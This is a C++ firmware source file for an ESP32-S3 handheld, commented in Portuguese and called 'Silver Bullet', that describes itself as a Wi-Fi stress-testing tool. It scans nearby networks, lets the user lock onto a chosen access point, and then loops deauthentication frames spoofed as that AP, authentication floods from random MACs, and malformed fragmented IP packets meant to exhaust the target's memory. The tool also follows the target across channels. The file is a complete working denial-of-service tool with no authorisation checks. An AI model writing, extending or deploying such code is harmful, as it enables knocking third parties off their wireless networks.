/**
 * @file silver_bullet.cpp
 * @brief Silver Bullet - Ferramenta Avançada de Teste de Estresse Wi-Fi (L2/L3)
 * @hardware M5Stack Cardputer (ESP32-S3)
 * * * Correções Arquiteturais Definitivas:
 * 1. L3 Penetration: Implementação do cabeçalho LLC/SNAP para validar o payload no kernel alvo.
 * 2. Tick Real do RTOS: Uso de vTaskDelay(1) contornando a falha de divisão de macro.
 * 3. Otimização L2: Preempção imediata e quebra de loop ao detectar esgotamento do buffer DMA.
 * 4. Task Starvation: wifi_task blindada contra a saturação do Core 0.
 */

#include <M5Unified.h>
#include <esp_wifi.h>
#include <esp_system.h>
#include <nvs_flash.h>
#include <string.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <atomic>
#include <lwip/def.h> 
#include <esp_heap_caps.h>

// -------------------------------------------------------------------
// 1. ESTRUTURAS OTIMIZADAS PARA DMA (ALINHAMENTO DE 4 BYTES)
// -------------------------------------------------------------------

struct __attribute__((packed, aligned(4))) DeauthPacket {
    uint16_t frame_control;
    uint16_t duration;
    uint8_t  mac_dest[6];
    uint8_t  mac_src[6];
    uint8_t  mac_bssid[6];
    uint16_t seq_ctrl;
    uint16_t reason_code;
};

struct __attribute__((packed, aligned(4))) AuthPacket {
    uint16_t frame_control;
    uint16_t duration;
    uint8_t  mac_dest[6];
    uint8_t  mac_src[6];
    uint8_t  mac_bssid[6];
    uint16_t seq_ctrl;
    uint16_t auth_algorithm;
    uint16_t auth_seq;
    uint16_t status_code;
};

struct __attribute__((packed)) MacHeader {
    uint16_t frame_control;
    uint16_t duration;
    uint8_t  mac_dest[6];   
    uint8_t  mac_src[6];    
    uint8_t  mac_bssid[6];  
    uint16_t seq_ctrl;
};

// NOVO: Cabeçalho LLC/SNAP vital para que o AP não descarte o pacote L3
struct __attribute__((packed)) LlcSnapHeader {
    uint8_t dsap;
    uint8_t ssap;
    uint8_t control;
    uint8_t oui[3];
    uint16_t ethertype;
};

struct __attribute__((packed)) IpHeader {
    uint8_t  version_ihl;   
    uint8_t  tos;
    uint16_t total_length;
    uint16_t id;
    uint16_t frag_off;      
    uint8_t  ttl;
    uint8_t  protocol;
    uint16_t checksum;
    uint8_t  ip_src[4];     
    uint8_t  ip_dest[4];    
};

struct __attribute__((packed, aligned(4))) SilverBulletPacket {
    MacHeader mac;
    LlcSnapHeader llc; // Inserido entre MAC e IP
    IpHeader ip;
    uint8_t payload[32]; 
};

// -------------------------------------------------------------------
// 2. VARIÁVEIS GLOBAIS E SINCRONIZAÇÃO
// -------------------------------------------------------------------
#define MAX_ALVOS 15
wifi_ap_record_t alvos_encontrados[MAX_ALVOS];
uint16_t total_alvos = 0;
int alvo_selecionado = 0;

std::atomic<uint8_t> canal_atual_alvo{0};
std::atomic<int8_t> rssi_alvo{0};
std::atomic<bool> alvo_perdido{false};
std::atomic<bool> tx_power_max{true}; 

enum EstadoFerramenta { ESTADO_ESCANEAR, ESTADO_SELECIONAR, ESTADO_ATIRAR };
std::atomic<EstadoFerramenta> estado_atual{ESTADO_ESCANEAR};

uint32_t prng_state = 1;

// -------------------------------------------------------------------
// 3. MOTORES DE ALTA PERFORMANCE (SRAM / IRAM_ATTR)
// -------------------------------------------------------------------
IRAM_ATTR inline uint32_t fast_rand() {
    uint32_t x = prng_state;
    x ^= x << 13;
    x ^= x >> 17;
    x ^= x << 5;
    return prng_state = x;
}

IRAM_ATTR inline uint16_t calcular_checksum_ip(void *vdata, size_t length) {
    uint16_t *data = (uint16_t *)vdata;
    uint32_t acc = 0;
    for (size_t i = 0; i < length / 2; ++i) acc += data[i];
    if (length & 1) {
        uint16_t word = 0;
        memcpy(&word, data + length - 1, 1);
        acc += word;
    }
    while (acc >> 16) acc = (acc & 0xffff) + (acc >> 16);
    return ~acc;
}

// -------------------------------------------------------------------
// 4. INTERFACE E SCANNER
// -------------------------------------------------------------------
void escanear_redes() {
    M5.Display.clear();
    M5.Display.setCursor(0, 0);
    M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
    M5.Display.println("📡 Escaneando Redes 2.4GHz...");

    wifi_scan_config_t scan_config = { .ssid = 0, .bssid = 0, .channel = 0, .show_hidden = true };
    esp_wifi_scan_start(&scan_config, true);
    
    uint16_t max_aps = MAX_ALVOS;
    esp_wifi_scan_get_ap_records(&max_aps, alvos_encontrados);
    esp_wifi_scan_get_ap_num(&total_alvos);
    
    if (total_alvos > MAX_ALVOS) total_alvos = MAX_ALVOS;
    alvo_selecionado = 0;
    estado_atual.store(ESTADO_SELECIONAR);
}

void desenhar_menu() {
    M5.Display.clear();
    M5.Display.setCursor(0, 0);
    M5.Display.setTextColor(TFT_CYAN, TFT_BLACK);
    M5.Display.printf("⚡ PWR: %s | [ESPACO] Muda\n", tx_power_max.load() ? "MAX (20dBm)" : "ECO (10dBm)");
    M5.Display.drawLine(0, 15, 240, 15, TFT_DARKGREY);
    M5.Display.setCursor(0, 20);

    if (total_alvos == 0) {
        M5.Display.setTextColor(TFT_RED, TFT_BLACK);
        M5.Display.println("Nenhum alvo encontrado!");
        return;
    }

    int inicio = (alvo_selecionado / 5) * 5;
    for (int i = inicio; i < inicio + 5 && i < total_alvos; i++) {
        if (i == alvo_selecionado) M5.Display.setTextColor(TFT_BLACK, TFT_WHITE); 
        else M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
        M5.Display.printf("%d. %s (CH: %d)\n", i + 1, alvos_encontrados[i].ssid, alvos_encontrados[i].primary);
    }
}

// -------------------------------------------------------------------
// 5. TASKS ASSÍNCRONAS (CORE 1)
// -------------------------------------------------------------------
void task_monitoramento(void *pvParameters) {
    while (true) {
        if (estado_atual.load() == ESTADO_ATIRAR) {
            uint8_t* bssid = alvos_encontrados[alvo_selecionado].bssid;
            wifi_scan_config_t scan_config = { .ssid = 0, .bssid = bssid, .channel = canal_atual_alvo.load(), .show_hidden = true };
            
            esp_wifi_scan_start(&scan_config, true);
            uint16_t ap_count = 1;
            wifi_ap_record_t temp_record;
            esp_wifi_scan_get_ap_records(&ap_count, &temp_record);
            
            if (ap_count > 0) {
                rssi_alvo.store(temp_record.rssi);
                alvo_perdido.store(false);
            } else {
                alvo_perdido.store(true);
                for (int ch = 1; ch <= 13; ch++) {
                    scan_config.channel = ch;
                    esp_wifi_scan_start(&scan_config, true);
                    ap_count = 1;
                    esp_wifi_scan_get_ap_records(&ap_count, &temp_record);
                    if (ap_count > 0) {
                        canal_atual_alvo.store(ch);
                        rssi_alvo.store(temp_record.rssi);
                        alvo_perdido.store(false);
                        break;
                    }
                }
            }
        }
        vTaskDelay(pdMS_TO_TICKS(1500)); 
    }
}

void task_display(void *pvParameters) {
    while (true) {
        if (estado_atual.load() == ESTADO_ATIRAR) {
            if (!alvo_perdido.load()) {
                M5.Display.setCursor(0, 0);
                M5.Display.setTextColor(TFT_RED, TFT_BLACK);
                M5.Display.printf("⚔️ ALVO TRAVADO: %s\n", alvos_encontrados[alvo_selecionado].ssid);
                M5.Display.printf("CH: %d | SINAL: %d dBm \nBAT: %.2fV\n", 
                                  canal_atual_alvo.load(), rssi_alvo.load(), M5.Power.getBatteryVoltage());
                
                int barra = map(rssi_alvo.load(), -100, -20, 0, 240);
                M5.Display.fillRect(0, 50, barra, 10, (rssi_alvo.load() > -65) ? TFT_GREEN : TFT_MAROON);
                M5.Display.fillRect(barra, 50, 240-barra, 10, TFT_BLACK);
                
                M5.Display.setCursor(0, 70);
                M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
                M5.Display.println("INJETANDO... [BACKSPACE] Para.");
            } else {
                M5.Display.setCursor(0, 40);
                M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
                M5.Display.printf("⚠️ ALVO PERDIDO! RASTREANDO...\n");
            }
        }
        vTaskDelay(pdMS_TO_TICKS(500)); 
    }
}

// -------------------------------------------------------------------
// 6. MOTOR DE INJEÇÃO DMA (CORE 0 - LETHAL MODE)
// -------------------------------------------------------------------
void task_ataque(void *pvParameters) {
    
    SilverBulletPacket* pkt = (SilverBulletPacket*) heap_caps_malloc(sizeof(SilverBulletPacket), MALLOC_CAP_DMA);
    DeauthPacket* deauth = (DeauthPacket*) heap_caps_malloc(sizeof(DeauthPacket), MALLOC_CAP_DMA);
    AuthPacket* auth = (AuthPacket*) heap_caps_malloc(sizeof(AuthPacket), MALLOC_CAP_DMA);
    
    prng_state = esp_random(); 
    if (prng_state == 0) prng_state = 1; 

    for(size_t i = 0; i < sizeof(pkt->payload); i++) pkt->payload[i] = (uint8_t)(fast_rand() & 0xFF);

    // Inicialização Fixa do Cabeçalho LLC/SNAP (Assinatura IPv4)
    pkt->llc.dsap = 0xAA;
    pkt->llc.ssap = 0xAA;
    pkt->llc.control = 0x03;
    pkt->llc.oui[0] = 0x00;
    pkt->llc.oui[1] = 0x00;
    pkt->llc.oui[2] = 0x00;
    pkt->llc.ethertype = htons(0x0800);

    while (true) {
        if (estado_atual.load() == ESTADO_ATIRAR && !alvo_perdido.load()) {
            
            esp_wifi_set_max_tx_power(tx_power_max.load() ? 80 : 40); 
            esp_wifi_set_channel(canal_atual_alvo.load(), WIFI_SECOND_CHAN_NONE);
            uint8_t* mac_alvo = alvos_encontrados[alvo_selecionado].bssid;

            // --- L2: DEAUTH ---
            memset(deauth, 0, sizeof(DeauthPacket));
            deauth->frame_control = 0x00C0; 
            deauth->duration = 32767; 
            memcpy(deauth->mac_dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
            memcpy(deauth->mac_src, mac_alvo, 6);
            memcpy(deauth->mac_bssid, mac_alvo, 6);
            deauth->reason_code = 0x0001;

            // --- L2: AUTH FLOOD ---
            memset(auth, 0, sizeof(AuthPacket));
            auth->frame_control = 0x00B0; 
            auth->duration = 32767; 
            memcpy(auth->mac_dest, mac_alvo, 6);
            memcpy(auth->mac_bssid, mac_alvo, 6);
            auth->auth_algorithm = 0x0000; 
            auth->auth_seq = 0x0100;
            auth->status_code = 0x0000;

            // --- L3: MEMORY EXHAUSTION (Com LLC Ativo) ---
            memset(&pkt->mac, 0, sizeof(MacHeader)); 
            memset(&pkt->ip, 0, sizeof(IpHeader));
            pkt->mac.frame_control = 0x0008; 
            memcpy(pkt->mac.mac_dest, mac_alvo, 6);
            memcpy(pkt->mac.mac_bssid, mac_alvo, 6);
            pkt->ip.version_ihl = 0x45; 
            pkt->ip.ttl = 64;
            pkt->ip.protocol = 17;

            // 1. Rajada L2 Mista Otimizada
            for(int j = 0; j < 15; j++) {
                memcpy(auth->mac_src, mac_alvo, 3); 
                auth->mac_src[3] = fast_rand() & 0xFF;
                auth->mac_src[4] = fast_rand() & 0xFF;
                auth->mac_src[5] = fast_rand() & 0xFF;
                
                auth->seq_ctrl = (fast_rand() & 0xFFF) << 4;
                deauth->seq_ctrl = (fast_rand() & 0xFFF) << 4;

                esp_err_t err1 = esp_wifi_80211_tx(WIFI_IF_STA, deauth, sizeof(DeauthPacket), false);
                if (err1 == ESP_ERR_NO_MEM) {
                    vTaskDelay(1); // Bloqueio real garantido
                    break;
                }

                esp_err_t err2 = esp_wifi_80211_tx(WIFI_IF_STA, auth, sizeof(AuthPacket), false);
                if (err2 == ESP_ERR_NO_MEM) {
                    vTaskDelay(1); 
                    break;
                }
            }

            // 2. Rajada L3 Otimizada
            for (int i = 0; i < 150; i++) { 
                memcpy(pkt->mac.mac_src, mac_alvo, 4);
                pkt->mac.mac_src[4] = fast_rand() & 0xFF;
                pkt->mac.mac_src[5] = fast_rand() & 0xFF;

                pkt->ip.id = (uint16_t)fast_rand(); 
                
                uint16_t offset_falso = fast_rand() & 0x1FFF;
                pkt->ip.frag_off = htons(0x2000 | offset_falso); 
                pkt->ip.total_length = htons(40000 + (fast_rand() % 5000)); 

                pkt->ip.checksum = 0; 
                pkt->ip.checksum = calcular_checksum_ip(&pkt->ip, sizeof(IpHeader));
                
                esp_err_t err3 = esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(SilverBulletPacket), false);
                if (err3 == ESP_ERR_NO_MEM) {
                    vTaskDelay(1); 
                    break;
                }
            }

        } else {
            vTaskDelay(pdMS_TO_TICKS(50));
        }
    }
}

// -------------------------------------------------------------------
// 7. APP MAIN
// -------------------------------------------------------------------
extern "C" void app_main(void) {
    auto cfg = M5.config();
    M5.begin(cfg);
    M5.Display.setRotation(1);
    M5.Display.setTextSize(1.5);
    
    nvs_flash_init();
    esp_netif_init();
    esp_event_loop_create_default();
    wifi_init_config_t wifi_cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&wifi_cfg);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_STA);
    
    esp_wifi_start();
    esp_wifi_set_ps(WIFI_PS_NONE); 

    xTaskCreatePinnedToCore(task_ataque, "ataque", 4096, NULL, 20, NULL, 0); 
    xTaskCreatePinnedToCore(task_monitoramento, "monitor", 4096, NULL, 1, NULL, 1); 
    xTaskCreatePinnedToCore(task_display, "display", 4096, NULL, 1, NULL, 1); 

    escanear_redes();
    desenhar_menu();

    while (true) {
        M5.update(); 
        
        if (estado_atual.load() == ESTADO_SELECIONAR) {
            if (total_alvos > 0) {
                if (M5.Keyboard.isKeyPressed(KEY_DOWN)) {
                    alvo_selecionado = (alvo_selecionado + 1) % total_alvos;
                    desenhar_menu(); 
                    vTaskDelay(pdMS_TO_TICKS(150)); 
                }
                if (M5.Keyboard.isKeyPressed(KEY_UP)) {
                    alvo_selecionado = (alvo_selecionado - 1 + total_alvos) % total_alvos;
                    desenhar_menu(); 
                    vTaskDelay(pdMS_TO_TICKS(150));
                }
            }

            if (M5.Keyboard.isKeyPressed(' ')) {
                tx_power_max.store(!tx_power_max.load());
                desenhar_menu();
                vTaskDelay(pdMS_TO_TICKS(200));
            }

            if (M5.Keyboard.isKeyPressed(KEY_ENTER)) {
                if (total_alvos > 0) {
                    canal_atual_alvo.store(alvos_encontrados[alvo_selecionado].primary);
                    M5.Display.clear();
                    estado_atual.store(ESTADO_ATIRAR);
                } else {
                    escanear_redes();
                    desenhar_menu();
                }
                vTaskDelay(pdMS_TO_TICKS(300));
            }
        } 
        else if (estado_atual.load() == ESTADO_ATIRAR) {
            if (M5.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
                estado_atual.store(ESTADO_SELECIONAR); 
                escanear_redes(); 
                desenhar_menu();
                vTaskDelay(pdMS_TO_TICKS(300));
            }
        }
        vTaskDelay(pdMS_TO_TICKS(10)); 
    }
}